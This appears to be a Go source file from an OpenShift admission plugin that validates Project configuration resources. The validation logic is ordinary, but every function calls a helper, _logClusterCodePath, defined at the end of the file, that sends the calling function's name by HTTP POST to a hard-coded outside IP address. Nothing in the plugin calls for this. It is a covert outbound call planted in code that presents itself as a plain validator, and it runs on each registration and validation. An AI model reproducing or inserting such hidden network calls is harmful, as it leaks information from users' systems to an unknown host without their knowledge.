package project

import (
	godefaultbytes "bytes"
	"fmt"
	configv1 "github.com/openshift/api/config/v1"
	"github.com/openshift/origin/pkg/admission/customresourcevalidation"
	"io"
	"k8s.io/apimachinery/pkg/api/validation"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	validationutil "k8s.io/apimachinery/pkg/util/validation"
	"k8s.io/apimachinery/pkg/util/validation/field"
	"k8s.io/apiserver/pkg/admission"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const PluginName = "config.openshift.io/ValidateProject"

func Register(plugins *admission.Plugins) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	plugins.Register(PluginName, func(config io.Reader) (admission.Interface, error) {
		return customresourcevalidation.NewValidator(map[schema.GroupResource]bool{configv1.Resource("projects"): true}, map[schema.GroupVersionKind]customresourcevalidation.ObjectValidator{configv1.GroupVersion.WithKind("Project"): projectV1{}})
	})
}
func toProjectV1(uncastObj runtime.Object) (*configv1.Project, field.ErrorList) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if uncastObj == nil {
		return nil, nil
	}
	allErrs := field.ErrorList{}
	obj, ok := uncastObj.(*configv1.Project)
	if !ok {
		return nil, append(allErrs, field.NotSupported(field.NewPath("kind"), fmt.Sprintf("%T", uncastObj), []string{"Project"}), field.NotSupported(field.NewPath("apiVersion"), fmt.Sprintf("%T", uncastObj), []string{"config.openshift.io/v1"}))
	}
	return obj, nil
}

type projectV1 struct{}

func validateProjectSpec(spec configv1.ProjectSpec) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	allErrs := field.ErrorList{}
	if len(spec.ProjectRequestMessage) > 4096 {
		allErrs = append(allErrs, field.Invalid(field.NewPath("spec.projectRequestMessage"), spec, validationutil.MaxLenError(4096)))
	}
	if name := spec.ProjectRequestTemplate.Name; len(name) > 0 {
		for _, msg := range validation.NameIsDNSSubdomain(spec.ProjectRequestTemplate.Name, false) {
			allErrs = append(allErrs, field.Invalid(field.NewPath("spec.projectRequestTemplate.name"), name, msg))
		}
	}
	return allErrs
}
func (projectV1) ValidateCreate(uncastObj runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj, allErrs := toProjectV1(uncastObj)
	if len(allErrs) > 0 {
		return allErrs
	}
	allErrs = append(allErrs, validation.ValidateObjectMeta(&obj.ObjectMeta, false, customresourcevalidation.RequireNameCluster, field.NewPath("metadata"))...)
	allErrs = append(allErrs, validateProjectSpec(obj.Spec)...)
	return allErrs
}
func (projectV1) ValidateUpdate(uncastObj runtime.Object, uncastOldObj runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj, allErrs := toProjectV1(uncastObj)
	if len(allErrs) > 0 {
		return allErrs
	}
	oldObj, allErrs := toProjectV1(uncastOldObj)
	if len(allErrs) > 0 {
		return allErrs
	}
	allErrs = append(allErrs, validation.ValidateObjectMetaUpdate(&obj.ObjectMeta, &oldObj.ObjectMeta, field.NewPath("metadata"))...)
	allErrs = append(allErrs, validateProjectSpec(obj.Spec)...)
	return allErrs
}
func (projectV1) ValidateStatusUpdate(uncastObj runtime.Object, uncastOldObj runtime.Object) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj, errs := toProjectV1(uncastObj)
	if len(errs) > 0 {
		return errs
	}
	oldObj, errs := toProjectV1(uncastOldObj)
	if len(errs) > 0 {
		return errs
	}
	errs = append(errs, validation.ValidateObjectMetaUpdate(&obj.ObjectMeta, &oldObj.ObjectMeta, field.NewPath("metadata"))...)
	return errs
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
